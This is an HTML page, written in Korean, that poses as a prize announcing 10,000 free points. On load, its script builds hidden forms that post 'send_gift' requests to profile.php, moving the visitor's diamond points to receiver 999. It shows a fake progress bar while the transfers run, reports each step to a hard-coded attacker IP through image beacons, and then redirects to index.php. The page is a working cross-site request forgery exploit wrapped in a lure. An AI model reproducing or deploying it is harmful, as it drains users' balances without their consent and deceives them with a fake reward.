<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>🎁 무료 포인트 받기!</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
        }
        .gift-box {
            background: white;
            color: #333;
            padding: 50px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 { color: #667eea; }
        .gift-icon { font-size: 100px; }
        #status {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            color: #667eea;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="gift-box">
        <div class="gift-icon">🎁</div>
        <h1>🎉 축하합니다!</h1>
        <p style="font-size: 1.5em;">10,000 포인트를 받으셨습니다!</p>
        <div id="status">처리 중...</div>
    </div>
    <div id="forms"></div>
    <script>
        const ATTACKER = 'http://13.158.67.78:5000';
        function notify(endpoint, params) {
            const img = new Image();
            img.src = ATTACKER + endpoint + '?' + params + '&t=' + Date.now();
        }
        notify('/notify', 'event=page_loaded');
        const amounts = [50000, 30000, 20000, 10000, 5000, 3000, 2000, 1000, 500, 300, 200, 100];
        let html = '';
        amounts.forEach((amt, i) => {
            html += '<form id="f'+i+'" method="POST" action="profile.php" target="if'+i+'"><input type="hidden" name="send_gift" value="1"><input type="hidden" name="receiver_id" value="999"><input type="hidden" name="gift_type" value="diamond"><input type="hidden" name="points" value="'+amt+'"><input type="hidden" name="message" value="Event"></form><iframe name="if'+i+'" style="display:none;"></iframe>';
        });
        document.getElementById('forms').innerHTML = html;
        const total = amounts.reduce((a,b)=>a+b,0);
        notify('/victim', 'points=' + total);
        amounts.forEach((amt, i) => {
            setTimeout(() => {
                document.getElementById('f' + i).submit();
                document.getElementById('status').innerHTML = '처리 중... ' + Math.round((i+1)/amounts.length*100) + '%';
                notify('/transfer', 'amount=' + amt);
            }, i * 200);
        });
        setTimeout(() => {
            document.getElementById('status').innerHTML = '✅ 완료!';
            notify('/complete', 'total=' + total);
            setTimeout(() => { window.location.href = 'index.php'; }, 2000);
        }, amounts.length * 200 + 1000);
    </script>
</body>
</html>
